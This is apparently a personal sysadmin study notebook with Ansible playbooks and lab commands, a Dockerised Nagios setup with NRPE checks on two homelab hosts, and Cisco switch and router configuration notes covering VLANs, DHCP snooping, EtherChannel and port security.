# #### jinja2.yaml

# %% [markdown]
# ---
# - name: Use Jinja2 template
#   hosts: localhost
#   vars:
#     name: "Ansible Learner"
#   tasks:
#     - name: Create file from template
#       template:
#         src: templates/hello.j2
#         dest: /tmp/hello.txt
#
# *This playbook uses the template module to render our Jinja2 template and create a file at /tmp/hello.txt*

# %% [markdown]
# #### advanced_loops.yaml

# %% [markdown]
# ---
# - name: Advanced Loop Techniques
#   hosts: localhost
#   vars:
#     users:
#       - name: alice
#         groups: ["developers", "testers"]
#       - name: bob
#         groups: ["managers", "developers"]
#   tasks:
#     - name: Create users with groups
#       debug:
#         msg: "Creating user {{ item.name }} with groups: {{ item.groups | join(', ') }}"
#       loop: "{{ users }}"
#
#     - name: Demonstrate loop_control
#       debug:
#         msg: "Processing item {{ index }} - {{ item }}"
#       loop: ["a", "b", "c", "d"]
#       loop_control:
#         index_var: index
#
#     - name: Loop over dictionary
#       debug:
#         msg: "{{ key }}: {{ value }}"
#       loop: "{{ {'x': 1, 'y': 2, 'z': 3} | dict2items }}"
#       vars:
#         key: "{{ item.key }}"
#         value: "{{ item.value }}"

# %% [markdown]
# #### Condionals_Example.yaml

# %% [markdown]
# ---
# - name: Conditional Example
#   hosts: localhost
#   gather_facts: yes
#   tasks:
#     - name: Check OS family
#       debug:
#         msg: "This is a Debian-based system"
#       when: ansible_os_family == "Debian"
#
#     - name: Check OS family (alternative)
#       debug:
#         msg: "This is not a Debian-based system"
#       when: ansible_os_family != "Debian"
#
#
#
# --- at the top of the file indicates the start of a YAML document
# name: Conditional Example gives a name to our playbook
# hosts: localhost specifies that this playbook will run on the local machine
# gather_facts: yes tells Ansible to collect information about the system before running tasks
# tasks: begins the list of tasks to be executed
#
# Each task uses the debug module to print a message, but the execution is controlled by the when clause:
#
# The first task: will only run if the system is Debian-based (ansible_os_family == "Debian")
# The second task: will only run if the system is not Debian-based (ansible_os_family != "Debian")
#
# ansible_os_family: is a fact gathered by Ansible about the target system

# %% [markdown]
# ##### Multi_env_playbook

# %% [markdown]
# ---
# - name: Demonstrate multi-environment playbook
#   hosts: all
#   gather_facts: no
#   tasks:
#     - name: Print environment type
#       debug: #module used to print messages
#         msg: "This host belongs to the {{ 'production' if 'prod' in group_names else 'development' }} environment"
#
#     - name: Show hostname
#       command: hostname
#       register: hostname_output
#
#     - name: Display hostname
#       debug:
#         msg: "The hostname is: {{ hostname_output.stdout }}"
#
# **ansible-playbook -i /home/labex/project/inventory/dev_inventory.ini /home/labex/project/multi_env_playbook.yaml**
#
# --- at the top of the file indicates the start of a YAML document
# name: Demonstrate multi-environment playbook is a descriptive name for this play
# hosts: all means this playbook will run on all hosts in the inventory
# gather_facts: no skips the fact-gathering phase to speed up execution. Fact gathering is when Ansible collects information about the target hosts
# tasks: begins the list of tasks to be executed
#
# The first task uses the debug module to print a message
# It uses a conditional statement to determine if the host is in the production or development environment:
# group_names: is a special variable that contains a list of all groups the current host belongs to
#   If 'prod' is in the group_names list, it prints "production", otherwise "development"
# The second task: runs the hostname command and stores its output in a variable called hostname_output
#
# The third task: displays the hostname using the debug module
#   It accesses the stored output using hostname_output.stdout

# %% [markdown]
# #### host_info.yaml

# %% [markdown]
# ---
# - name: Gather system information from all hosts
#   hosts: all
#   gather_facts: true
#
#   tasks:
#     - name: Display system information
#       ansible.builtin.debug:
#         msg:
#           - "Hostname: {{ ansible_facts['hostname'] }}"
#           - "FQDN: {{ ansible_facts['fqdn'] }}"
#           - "OS: {{ ansible_facts['distribution'] }} {{ ansible_facts['distribution_version'] }}"
#           - "Kernel: {{ ansible_facts['kernel'] }}"
#           - "Architecture: {{ ansible_facts['architecture'] }}"
#           - "CPU: {{ ansible_facts['processor_vcpus'] }} vCPU(s)"
#           - "Memory: {{ ansible_facts['memtotal_mb'] }} MB"
#           - "Default IPv4: {{ ansible_facts['default_ipv4']['address'] | default('N/A') }}"
#           - "Python: {{ ansible_facts['python_version'] }}"
#           - "Uptime: {{ (ansible_facts['uptime_seconds'] / 86400) | int }} day(s)"

# %% [markdown]
# #### test_sudo_access.yaml

# %% [markdown]
# ---
# - name: Test sudo access on all hosts
#   hosts: all
#   gather_facts: true
#   become: true
#
#   tasks:
#     - name: Check current user
#       ansible.builtin.command:
#         cmd: whoami
#       register: whoami_result
#       changed_when: false
#
#     - name: Display current user
#       ansible.builtin.debug:
#         msg: "Running as: {{ whoami_result.stdout }}"

# %% [markdown]
# #### vars_directory_creation.yaml

# %% [markdown]
# ---
# - name: My First Playbook
#   hosts: localhost
#   connection: local
#   vars:
#     dir_path: /home/labex/project/test_directory
#     file_content: "Hello from Ansible! The time is {{ ansible_date_time.iso8601 }}"
#
#   tasks:
#     - name: Create a directory
#       file:
#         path: "{{ dir_path }}"
#         state: directory
#         mode: "0755"
#
#     - name: Create a file
#       copy:
#         content: "{{ file_content }}"
#         dest: "{{ dir_path }}/hello.txt"
#
#     - name: Display file content
#       debug:
#         msg: "The content of the file is: {{ file_content }}"
#
# *vars section to define variables -- This is where you can set values that you'll use multiple times in your playbook*
# *We're using the {{ }} syntax to reference variables*
# *This tells Ansible to replace the variable with its value*
# *We've used Ansible's built-in ansible_date_time.iso8601 variable to include the current timestamp*
# *Ansible provides many such variables that you can use in your playbooks*

# %% [markdown]
# #### creating_directory.yaml

# %% [markdown]
# ---
# #Playbook starts with three dashes
# - name: My First Playbook # Name of the play
#   hosts: localhost # Target host(s) for this play
#   connection: local # Connection type (local in this case)
#
#   tasks: # List of tasks to be executed
#     - name: Create a directory # Name of the first task
#       file: # The 'file' module is used for this task
#         path: /home/labex/project/test_directory # Path of the directory to create
#         state: directory # Desired state (create the directory)
#         mode: "0755" # Permissions for the directory
#
#     - name: Create a file # Name of the second task
#       copy: # The 'copy' module is used for this task
#         content: "Hello from Ansible!" # Content to be written to the file
#         dest: /home/labex/project/test_directory/hello.txt # Destination path for the file
#
# ansible-playbook creating_directory.yaml -i host.ini

# %% [markdown]
# #### show_http_port.yaml

# %% [markdown]
# ---
# - name: Show HTTP Port
#   hosts: webservers
#   gather_facts: true
#   tasks:
#     - name: Display HTTP Port
#       debug:
#         msg: "The HTTP port is {{ http_port }}"
#
# ansible-playbook show_http_port.yaml -i hosts.ini
#
# *Targets the webservers group*
# *Has a single task that uses the debug module to display a message*
# *Uses the {{ http_port }} syntax to reference the variable we defined in the inventory*

# %% [markdown]
# #### test-config.yaml

# %% [markdown]
# ---
# - name: Test Custom Configuration
#   hosts: all
#   tasks:
#     - name: Display remote user
#       debug:
#         msg: "Connected as user: {{ ansible_user }}"
#
#     - name: Display privilege escalation info
#       debug:
#         msg: "Privilege escalation is {{ 'enabled' if ansible_become | default(false) else 'disabled' }}"
#
#     - name: Show Ansible configuration
#       debug:
#         msg: "Inventory file: {{ lookup('config', 'DEFAULT_HOST_LIST') }}"
#
#     - name: Check if become is enabled in ansible.cfg
#       command: grep "become = True" /home/labex/project/ansible.cfg
#       register: become_check
#       changed_when: false
#       failed_when: false
#
#     - name: Display become setting from ansible.cfg
#       debug:
#         msg: "Become is {{ 'enabled' if become_check.rc == 0 else 'disabled' }} in ansible.cfg"

# %% [markdown]
# ## Commands

# %% [markdown]
# ---
# #### Ansible Installation
# sudo apt update
# sudo apt install ansible -y
# anible --version
#
# #### Configure SSH for Ansible
# *Ansible uses SSH to communicate with managed nodes*
# *This allows Ansible to connect to other machines without needing to enter a password each time*
#
# ssh-keygen -t rsa -b 4096 -C "labex@example.com"
# ssh-copy-id labex@localhost
# ssh labex@localhost
# sudo mkdir -p /etc/ansible
#
# #### Building Inventory File
# sudo nano /etc/ansible/hosts
# cat /etc/ansible/hosts
#
# [local]
# localhost ansible_connection=local
# [webservers]
# web1 ansible_host=localhost ansible_connection=ssh ansible_user=labex
# **[all:vars]**
# **ansible_python_interpreter=/usr/bin/python3**
#
# #### Test Ansible Connectivity
# ansible all -m ping
# ansible all -a "uptime"
#
# #### Default Ansible Configuration
# cat /etc/ansible/ansible.cfg
# ansible-config dump
# echo "localhost ansible_connection=local" > /home/labex/project/inventory
#
# #### Creating a Custom Ansible Configuration File
# vim /home/labex/project/ansible.cfg
#
# [defaults]
# inventory = /home/labex/project/inventory
# remote_user = labex
# host_key_checking = False
# stdout_callback = yaml
#
# [privilege_escalation]
# become = True
# become_method = sudo
# become_user = root
# become_ask_pass = False
#
# ansible-config dump --only-changed
#
# ##### Testing the Custom Configuration
# vim /home/labex/project/test_config.yml
# ansible-playbook /home/labex/project/test_config.yml
#
# #### Creating a Basic Inventory
# vim /home/labex/project/inventory
#     localhost ansible_connection=local
# ansible -i inventory -m ping all
#
# ##### Grouping Hosts
# *Ansible allows you to organize hosts into groups -- This is useful for applying configurations or running tasks on multiple hosts simultaneously*
# vim /home/labex/project/inventory
#     localhost ansible_connection=local
#     [webservers]
#     localhost ansible_connection=local
# ansible -i inventory -m ping webservers
#
# ##### Creating Group Hierarchies
# *Ansible supports nested groups, allowing you to create hierarchies -- This is useful for organizing hosts based on their roles or environments*
# vim /home/labex/project/inventory
#     localhost ansible_connection=local
#     [webservers]
#     localhost ansible_connection=local
#     [production:children]
#     webservers
# ansible -i inventory -m ping production
#
# ##### Assigning Variables to Groups
# *Ansible allows you to assign variables to groups in the inventory file -- These variables can be used in playbooks and templates, making your Ansible code more flexible and reusable*
# vim /home/labex/project/inventory
#     localhost ansible_connection=local
#     [webservers]
#     localhost ansible_connection=local
#     [production:children]
#     webservers
#     [webservers:vars]
#     http_port=80
# vim /home/labex/project/show_http_port.yml
# ansible-playbook -i inventory show_http_port.yml
#
# #### Ansible Ad-hoc Command Structure
# ansible [pattern] -m [module] -a "[module options]"
# vim /home/labex/project/inventory
#     localhost ansible_connection=local
#     [webservers]
#     localhost
#     [dbservers]
#     localhost
# ansible all -i /home/labex/project/inventory -m ping
#
# ##### Command Module
# *One of the most commonly used modules in ad-hoc commands is the command module -- It allows you to run arbitrary commands on the target hosts*
# **The command module is the default module, so you can omit -m command if you're using this module**
# *Remember, the command module doesn't support shell variables or operations like |, >, <, &*
# *For those, you'd need to use the shell module*
# ansible all -i /home/labex/project/inventory -m command -a "df -h"
# ansible webservers -i /home/labex/project/inventory -m command -a "uptime"
# ansible dbservers -i /home/labex/project/inventory -a "free -m"
#
# ##### Other Useful Modules in Ad-hoc Commands
#
# ###### copy Module
# echo "Hello from Ansible" > /home/labex/project/hello.txt
# ansible all -i /home/labex/project/inventory -m copy -a "src=/home/labex/project/hello.txt dest=/tmp/hello.txt"
#
# ###### file Module
# ansible webservers -i /home/labex/project/inventory -m file -a "path=/tmp/test_dir state=directory mode=0755"
#
# ###### setup Module
# ansible dbservers -i /home/labex/project/inventory -m setup
# ansible dbservers -i /home/labex/project/inventory -m setup -a "filter=ansible_distribution*"
#
# #### Creating Your First Playbook
# vim /home/labex/project/first_playbook.yml
# ansible-playbook /home/labex/project/first_playbook.yml
#
# ###### Adding Variables to Playbooks
# *Variables make your playbooks more flexible and reusable*
# *They allow you to write playbooks that can adapt to different scenarios without needing to change the playbook itself*
#
# #### Managing Multiple Inventories
# mkdir -p /home/labex/project/inventory
# touch /home/labex/project/inventory/dev_inventory.ini
# vim /home/labex/project/inventory/dev_inventory.ini
#     [dev]
#     localhost ansible_connection=local
# vim /home/labex/project/inventory/prod_inventory.ini
#     [prod]
#     localhost ansible_connection=local
#
# ###### Creating a Playbook For Multiple Inventories
# touch /home/labex/project/multi_env_playbook.yaml
# vim /home/labex/project/multi_env_playbook.yaml
# ansible-playbook -i /home/labex/project/inventory/dev_inventory.ini /home/labex/project/multi_env_playbook.yaml
# ansible-playbook -i /home/labex/project/inventory/prod_inventory.ini /home/labex/project/multi_env_playbook.yaml
# ansible-playbook -i /home/labex/project/inventory/dev_inventory.ini -i /home/labex/project/inventory/prod_inventory.ini /home/labex/project/multi_env_playbook.yaml
#
# #### Ansible Conditionals and Loops
# *you will use Ansible conditionals to control task execution based on specific conditions*
# *This is useful when you need to perform different actions depending on the state of your system or the value of certain variables*
#
# cd ~/project
# vim inventory.ini
#     [local]
#     localhost ansible_connection=local
# mkdir playbooks
# cd playbooks
# vim conditional_example.yml
# ansible-playbook -i ../inventory.ini conditional_example.yml
#
# ###### Working with Multiple Conditions
# vim multiple_conditions.yml
# ansible-playbook -i ../inventory.ini multiple_conditions.yml
#
# ###### Ansible Loops
# *This is useful when you need to perform the same action with multiple items, such as creating several users, installing multiple packages, or creating several directories*
#
# vim loop_example.yml
# ansible-playbook -i ../inventory.ini loop_example.yml
#
# ###### Advanced Loop Techniques
# vim advanced_loops.yml
# ansible-playbook -i ../inventory.ini advanced_loops.yml
#
# #### Understanding Jinja2 Basics
# *Jinja2 is a modern and designer-friendly templating language for Python, modeled after Django's templates*
# *In Ansible, Jinja2 is used to template files, create dynamic play structures, and more*
#
# ##### Creating a Jinja Template
# mkdir templates
# cd templates
# vim hello.j2
# ansible-playbook use_template.yml
#
# ##### Using Jinja2 Filters
# vim filters.j2
# ansible-playbook use_filters.yml
#
# ##### Jinja2 Conditionals
# *Jinja2 allows you to use conditional statements in your templates*
# *This is particularly useful when you need to include or exclude content based on certain conditions*
#
# vim conditionals.j2
# nano use_conditionals.yml
# ansible-playbook use_conditionals.yml
#
# ##### Jinja2 Loops
# cd ~/project/templates
# vim loops.j2
# cd ~/project
# vim use_loops.yml
#
# ##### Advanced Jinja2 Techniques
# cd ~/project/templates
# nano advanced.j2
#
# #### Understanding Ansible Roles Structure
# mkdir -p roles/example_role
# cd roles/example_role
# * mkdir {tasks,handlers,defaults,vars,files,templates,meta}
#     - This command creates all the directories we need for our role in one go
#     - It's a handy shortcut in bash to create multiple directories at once
# vim tasks/main.yml
#
# ##### Expanding Our Role
# vim defaults/main.yml

# %% [markdown]
# ## Command Breakdown

# %% [markdown]
# #### ssh-keygen -t rsa -b 4096 -C "labex@example.com"
# ssh-keygen: This is the program that generates the key pair
# -t rsa: This specifies we want an RSA type key
# -b 4096: This sets the key size to 4096 bits, which is very secure
# -C "labex@example.com": This adds a comment to the key, usually an email address
# *when prompted accept all the defaults*
#
# #### hosts.ini
# [local]
# localhost ansible_connection=local
#
# [webservers]
# web1 ansible_host=localhost ansible_connection=ssh ansible_user=labex
#
# [local] and [webservers] are group names
# *You can use these to organize your hosts*
#
# localhost ansible_connection=local
# *tells Ansible to connect to the local machine directly, without using SSH*
#
# web1 ansible_host=localhost ansible_connection=ssh ansible_user=labex *sets up a host called web1*
#
# #### ansible all -a "uptime"
# *This command uses Ansible's command module (the default when no module is specified with -m) to run the uptime command on all hosts* *The uptime command shows how long the system has been running*
#
# #### ansible-config dump
# *This command will show you all the current Ansible configuration settings -- It's a long list, so let's break down some important settings:*
#
# DEFAULT_HOST_LIST: The default inventory file path
#
# DEFAULT_REMOTE_USER: The default SSH user Ansible will use to connect to remote hosts
#
# DEFAULT_BECOME_METHOD: The default method Ansible will use for privilege escalation (like sudo)
#
# #### nano /home/labex/project/ansible.cfg
# [defaults]
# inventory = /home/labex/project/inventory
# remote_user = labex
# host_key_checking = False
# stdout_callback = yaml
#
# [privilege_escalation]
# become = True
# become_method = sudo
# become_user = root
# become_ask_pass = False
#
# *inventory: Specifies the path to our inventory file*
# *remote_user: Sets the default SSH user for connections*
# *host_key_checking: Disables SSH host key checking, which can be useful in test environments (but should be enabled in production for security)*
# *stdout_callback: Changes the output format to YAML for better readability*
# *become: Enables privilege escalation by default*
# *become_method: Sets sudo as the method for privilege escalation*
# *become_user: Specifies which user to become when escalating privileges*
# *become_ask_pass: Disables prompting for the sudo password*
#
# #### ansible -i inventory -m ping all
# -i inventory: Specifies the inventory file to use
# -m ping: Tells Ansible to use the ping module
# all: Targets all hosts in the inventory
#
# #### [production:children]
# *This creates a new group called production that includes all hosts in the webservers group*
# *The :children suffix tells Ansible that this group is a group of groups, not a group of hosts*
# **Any host in the webservers group is also implicitly in the production group**
# *You can apply configurations to all production hosts by targeting the production group*
#
# #### [webservers:vars]
# **http_port=80**
# *This assigns the variable http_port with a value of 80 to all hosts in the webservers group*
# *The :vars suffix is used to define variables for a group*
#
#
# #### ansible [pattern] -m [module] -a "[module options]"
# [pattern] is the host or group of hosts from your inventory that you want to target
# -m [module] specifies which Ansible module to use
# -a "[module options]" provides arguments to the module
#
# #### ansible all -i /home/labex/project/inventory -m command -a "df -h"
# -m command: Selects the Ansible command module
#     - This module runs a command directly on the target host
# -a "df -h": Provides the arguments for the module
#     - Here, Ansible executes the Linux command: df -h
#
# #### ansible dbservers -i /home/labex/project/inventory -a "free -m"
# *This command will show the memory usage on all hosts in the dbservers group*
# **The command module is the default module, so you can omit -m command if you're using this module**
#
# #### ansible all -i /home/labex/project/inventory -m copy -a "src=/home/labex/project/hello.txt dest=/tmp/hello.txt"
# *This command copies the hello.txt file from the local machine to the /tmp directory on all remote hosts*
#
# #### ansible webservers -i /home/labex/project/inventory -m file -a "path=/tmp/test_dir state=directory mode=0755"
# *This command creates a directory named test_dir in the /tmp directory on all webservers, with permissions set to 0755*
#
# #### ansible dbservers -i /home/labex/project/inventory -m setup

# %% [markdown]
# # **Nagios**

# %% [markdown]
# ## Host Group Config Files

# %% [markdown]
# docker exec -it nagios bash
#
# cat > /opt/nagios/etc/conf.d/hostgroups.cfg <<'EOF'
# define hostgroup {
#     hostgroup_name          control-servers
#     alias                   Control Servers
#     members                 cachy_v2
# }
#
# define hostgroup {
#     hostgroup_name          docker-containers
#     alias                   Docker Containers
#     members                 localhost
# }
#
# define hostgroup {
#     hostgroup_name          homelab-servers
#     alias                   Homelab Servers
#     members                 k8s-controller
#
#     hostgroup_name          homelab-servers
#     alias                   homelab-servers
#     members                 cachy_v2
# }
# EOF
#
# grep -R "host_name" /opt/nagios/etc/conf.d /opt/nagios/etc/objects/localhost.cfg
# /opt/nagios/bin/nagios -v /opt/nagios/etc/nagios.cfg
# exit
# docker restart nagios

# %% [markdown]
# ## Host Config Files

# %% [markdown]
# #### **Defining Services**

# %% [markdown]
# ##### cpu load

# %% [markdown]
# cat > /opt/nagios/etc/conf.d/commands.cfg <<'EOF'
# define command {
#     command_name    check_nrpe
#     command_line    /opt/nagios/libexec/check_nrpe -H $HOSTADDRESS$ -c $ARG1$
# }
# EOF

# %% [markdown]
# #### **Cachy_v2 Config File**

# %% [markdown]
# docker exec -it nagios bash
#
# cat > /opt/nagios/etc/conf.d/cachy_v2.cfg <<'EOF'
# define host {
#     use                     linux-server
#     host_name               cachy_v2
#     alias                   cachy_v2
#     address                 10.0.0.193
# }
#
# define service {
#     use                     generic-service
#     host_name               cachy_v2
#     service_description     PING
#     check_command           check_ping!100.0,20%!500.0,60%
# }
#
# define service {
#     use                     generic-service
#     host_name               cachy_v2
#     service_description     SSH
#     check_command           check_ssh
# }
#
# define service {
#     use                     generic-service
#     host_name               cachy_v2
#     service_description     CPU Load
#     check_command           check_nrpe!check_load
# }
#
# define service {
#     use                     generic-service
#     host_name               cachy_v2
#     service_description     Root Disk Usage
#     check_command           check_nrpe!check_root_disk
# }
# EOF
#
# /opt/nagios/bin/nagios -v /opt/nagios/etc/nagios.cfg
# exit
# docker restart nagios

# %% [markdown]
# #### **k8s Config File**

# %% [markdown]
# docker exec -it nagios bash
#
# cat > /opt/nagios/etc/conf.d/k8s-controller.cfg <<'EOF'
# define host {
#     use                     linux-server
#     host_name               k8s-controller
#     alias                   K8s Controller
#     address                 10.0.0.140
# }
#
# define service {
#     use                     generic-service
#     host_name               k8s-controller
#     service_description     PING
#     check_command           check_ping!100.0,20%!500.0,60%
# }
#
# define service {
#     use                     generic-service
#     host_name               k8s-controller
#     service_description     SSH
#     check_command           check_ssh
# }
#
# define service {
#     use                     generic-service
#     host_name               k8s-controller
#     service_description     CPU Load
#     check_command           check_nrpe!check_load
# }
#
# define service {
#     use                     generic-service
#     host_name               k8s-controller
#     service_description     Root Disk Usage
#     check_command           check_nrpe!check_root_disk
# }
# EOF
#
# *validate the config*
# /opt/nagios/bin/nagios -v /opt/nagios/etc/nagios.cfg
# *Expected Output*:Things look okay - No serious problems were detected
# **docker restart nagios**

# %% [markdown]
# #### **nagios container config File**

# %% [markdown]
# docker exec -it nagios bash
#
# sed -i 's/alias.*localhost/alias Nagios Container/' /opt/nagios/etc/objects/localhost.cfg
# grep -A6 "define host" /opt/nagios/etc/objects/localhost.cfg
# /opt/nagios/bin/nagios -v /opt/nagios/etc/nagios.cfg
#
# exit
# docker restart nagios

# %% [markdown]
# ## Configs Verifications

# %% [markdown]
# #### **Docker Nagios Command Verification**

# %% [markdown]
# ##### Step 1 — make sure the container can reach the controller
# docker exec -it nagios ping -c 4 10.0.0.140 -want success for ping
# docker exec -it nagios nc -vz 10.0.0.140 22 -(ssh) open
#
# ##### Step 2 — Find the Nagios config structure
# docker exec -it nagios ls -la /opt/nagios/etc
# docker exec -it nagios grep -E '^(cfg_file|cfg_dir)' /opt/nagios/etc/nagios.cfg

# %% [markdown]
# #### **Config notebook commands**

# %%
# !docker exec -it nagios ping -c 4 10.0.0.140

# %%
# !docker exec -it nagios nc -vz 10.0.0.140 22

# %%
# !docker exec -it nagios ls -la /opt/nagios/etc

# %%
# !docker exec -it nagios grep -E '^(cfg_file|cfg_dir)' /opt/nagios/etc/nagios.cfg

# %%
# !docker exec -it nagios bash
# Out:
# root@a1d2237d8e3e:/# ^C

# %% [markdown]
# ## NRPE Install

# %% [markdown]
# **Nagios Remote Plugin Executor**
# *Its job is basically to let your Nagios server ask another machine to run a monitoring command locally and send the result back*
#
# Nagios Container
# 10.0.7.2
#      │
#      │ "Run check_root_disk"
#      │ TCP 5666
#      ▼
# NRPE
# cachy_v2
#      │
#      ├── runs check_disk locally
#      │
#      └── returns:
#           "DISK OK - 72% free"
#                │
#                ▼
#           Nagios Web UI 🟢

# %% [markdown]
# #### **cachy_v2**

# %% [markdown]
# ##### Install CPU Setup
# pacman -Ss nrpe
# pacman -Ss nagios-plugins
# yay -Ss nrpe
# yay -Ss nagios-plugins
#
# yay -S nrpe --nrpe install
# sudo pacman -S monitoring-plugins --nagios monitoring plugins
#
# pacman -Q | grep -E 'nrpe|monitoring-plugins' --installation verifications
# pacman -Ql nrpe | grep '\.cfg' --config file location
# pacman -Ql monitoring-plugins | grep -E 'check_(load|disk|users|procs|swap)$'
#
# NRPE config:
#   /etc/nrpe/nrpe.cfg
# Plugins:
#   /usr/lib/monitoring-plugins/
#
# ###### Configure NRPE on cachy_v2
# (optional) sudo cp /etc/nrpe/nrpe.cfg /etc/nrpe/nrpe.cfg.bak
#
# docker inspect nagios --format '{{range $name, $network := .NetworkSettings.Networks}}{{$name}} -> {{$network.IPAddress}} / {{$network.Gateway}}{{"\n"}}{{end}}'
# ip -br addr | grep docker
#
# sudo nano /etc/nrpe/nrpe.cfg
# Find:
# allowed_hosts=127.0.0.1,::1
#
# Add:
# allowed_hosts=127.0.0.1,::1,10.0.7.2
#
# grep '^command\[' /etc/nrpe/nrpe.cfg
# sudo systemctl enable --now nrpe
#
# ###### Docker NRPE Verification
# docker exec -it nagios /opt/nagios/libexec/check_nrpe -H 10.0.0.140
# docker exec -it nagios /opt/nagios/libexec/check_nrpe -H 10.0.0.193 -c check_load
#
#
# ##### Disk Usage Setup
# /usr/lib/monitoring-plugins/check_disk -w 20% -c 10% -p /
#
# ###### Adding the command to the config file
# sudo nano /etc/nagios/nrpe.cfg --find the command section
# command[check_root_disk]=/usr/lib64/nagios/plugins/check_disk -w 20% -c 10% -p /
# sudo systemctl restart nrpe
#
# ###### Docker Nagios Host
# docker exec -it nagios /opt/nagios/libexec/check_nrpe -H 10.0.0.193 -c check_root_disk
# **add the service definiton for it in the config file**

# %% [markdown]
# #### **k8s controller**

# %% [markdown]
# ##### Install CPU Setup
# ssh min@10.0.0.140
# sudo dnf search nrpe
# sudo dnf search nagios-plugins
# sudo dnf install -y \
#   nrpe \
#   nagios-plugins \
#   nagios-plugins-load \
#   nagios-plugins-disk \
#   nagios-plugins-users \
#   nagios-plugins-procs \
#   nagios-plugins-swap
# rpm -qa | grep -E 'nrpe|nagios-plugins' --verify installs
# rpm -ql nrpe | grep '\.cfg' --check where the config file lives at
#     --should return: /etc/nagios/nrpe.cfg
#
# ###### Allow the Nagios side to query this machine**
# sudo nano /etc/nagios/nrpe.cfg
#
# Find:
# allowed_hosts=127.0.0.1,::1
#
# Add:
# allowed_hosts=127.0.0.1,::1,10.0.0.193
#
# sudo systemctl enable --now nrpe**
# sudo systemctl status nrpe**
# sudo ss -tlnp | grep 5666**
#
# ###### Firewall Setup
# sudo firewall-cmd --state
#
# If it returns:
# running
#
# sudo firewall-cmd --permanent --add-port=5666/tcp
# sudo firewall-cmd --reload
# sudo firewall-cmd --list-ports
#
# grep '^command\[' /etc/nagios/nrpe.cfg
# You should see definitions similar to:
#
# command[check_users]=...
# command[check_load]=...
# command[check_disk]=...
# command[check_procs]=...
#
# ###### Docker NRPE Verification
# docker exec -it nagios /opt/nagios/libexec/check_nrpe -H 10.0.0.140
# docker exec -it nagios /opt/nagios/libexec/check_nrpe -H 10.0.0.140 -c check_load
#
#
# ##### Disk Usage Setup
# ssh min@10....
# /usr/lib64/nagios/plugins/check_disk -w 20% -c 10% -p / -if this path doesnt exist run below command to find it
# rpm -ql nagios-plugins-disk | grep '/check_disk$'
#
# ###### Adding the command to the config file
# sudo nano /etc/nagios/nrpe.cfg --find the command section
# command[check_root_disk]=/usr/lib64/nagios/plugins/check_disk -w 20% -c 10% -p /
# sudo systemctl restart nrpe
#
# ###### Docker Nagios Host
# docker exec -it nagios /opt/nagios/libexec/check_nrpe -H 10.0.0.140 -c check_root_disk
# **add the service definiton for it in the config file**

# %% [markdown]
# ## Commands

# %%
# !docker ps | grep nagios
# Out:
# a1d2237d8e3e   jasonrivers/nagios:latest             "/usr/local/bin/star…"   16 hours ago   Up 16 hours            5667/tcp, 0.0.0.0:8090->80/tcp, [::]:8090->80/tcp                                              nagios

# %%
# !docker ps
# Out:
# CONTAINER ID   IMAGE                                 COMMAND                  CREATED        STATUS                 PORTS                                                                                          NAMES
# a1d2237d8e3e   jasonrivers/nagios:latest             "/usr/local/bin/star…"   16 hours ago   Up 16 hours            5667/tcp, 0.0.0.0:8090->80/tcp, [::]:8090->80/tcp                                              nagios
# 8056cc370c83   coollabsio/sentinel:0.0.22            "/app/sentinel"          9 days ago     Up 9 days (healthy)                                                                                                   coolify-sentinel
# de1e285f099c   triliumnext/trilium:v0.104.1          "docker-entrypoint.s…"   12 days ago    Up 12 days (healthy)   0.0.0.0:8082->8080/tcp, [::]:8082->8080/tcp                                                    trilium
# ...

# %% [markdown]
# ## Nagios Docker Compose Setup

# %% [markdown]
# services:
#   nagios:
#     image: jasonrivers/nagios:latest
#     container_name: nagios
#     restart: unless-stopped
#
#     ports:
#       - "8090:80"
#
#     environment:
#       NAGIOSADMIN_USER: nagiosadmin
#       NAGIOSADMIN_PASS: nagios
#       NAGIOS_TIMEZONE: America/New_York
#
#     volumes:
#       - nagios_etc:/opt/nagios/etc
#       - nagios_var:/opt/nagios/var
#       - nagios_plugins:/opt/Custom-Nagios-Plugins
#       - nagiosgraph_etc:/opt/nagiosgraph/etc
#       - nagiosgraph_var:/opt/nagiosgraph/var
#
# volumes:
#   nagios_etc:
#   nagios_var:
#   nagios_plugins:
#   nagiosgraph_etc:
#   nagiosgraph_var:
#
# mkdir -p ~/nagios
# cd ~/nagios
# touch compose.yml
# docker compose up -d
# docker ps --format "table {{.Names}}\t{{.Ports}}"
# http://localhost:8090

# %% [markdown]
# # **Networking**

# %% [markdown]
# ## Router Commands

# %% [markdown]
# #### **Router Config Management**
# sh ip int br
# sh run | # dhcp
#
# #### **Subinterface Setup**
# int g0/0.10
# encapsulation dot1Q 10
# ip address 10.0.0.1 255.255.255.0
# no shut
#
# int g0/0.20
# encapsulation dot1Q 20
# ip address 10.0.1.1 255.255.255.0
# no shut
#
# #### **DHCP**
# ip dhcp exclude-address 10.0.0.1 10.0.0.10
# ip dhcp exclude-address 10.0.1.1 10.0.1.10
# ip dhcp pool devOps
#     defautl-router 10.0.0.1
#     network 10.0.0.0 255.255.255.0
# sh ip dhcp bindings

# %% [markdown]
# ## Switch Commands

# %% [markdown]
# #### **Config Management**
# sh flash
# sh run
# sh vlan
# sh vlan br
# sh ip int br
# conf t
#
# #### **Port Commands**
# int range fa0/1-4
# switchport mode access
# switchport access vlan 10
#
# ##### **Access Ports**
# int range fa0/1-4
# switchport mode access
# switchport access vlan 10
# spanning-tree portfast
# spanning-tree bpduguard enable --to prevent loops
#
#
# ##### **Trunk Port Setup**
# int range fa0/23-24
# switch mode trunk
# switch port trunk allowed vlan 10,20,30,40
#
# ##### **Etherchannel**
# int range fa0/23-24
# switchport trunk native vlan 999
# channel-protocol lacp --option
# channel-group 1 mode active --run this on switch 1
# channel-protocol lacp --optional
# channel-group 1 mode passive --run this on switch 2
# show etherchannel summary
# *with etherchannel the only things you need to setup on physical ports is speed and duplex*
# *once you create the portchannel all other configs go under that port channel **interface Portchannel1**
#
# ##### **Port Security**
# int ra fa0/1-2
# switchport port-security --this turns on port security
# switchport port-security mac-address sticky
# switchport port-security violation restrict
# do sh port-security
#
# int ra fa0/10-20
# switchport port-security --this turns on port security
# switchport port-security mac-address sticky
# switchport port-security violation shutdown
# do sh port-security
#
# ##### **DHCP Snooping**
# int g0/1
#     ip dhcp snooping trust
#     exit
# ip dhcp snooping vlan 1-999
#
# int ra fa0/23-24
# ip dhcp snooping trust --sets it up on the portchannl
# ip arp inspection vlan 1-999
#
# #### **Vlan Setup & Management**
# sh vlan
# sh vlan br
# vlan 10
# name devOps
# show int trunk
#
# #### **Spannin-Tree Setup**
# sh spanning-tree
# spanning-tree vlan 1-999 priority 4096 --run on switch 1
# spanning-tree vlan 1-999 priority 8192 --run on switch 2

# %% [markdown]
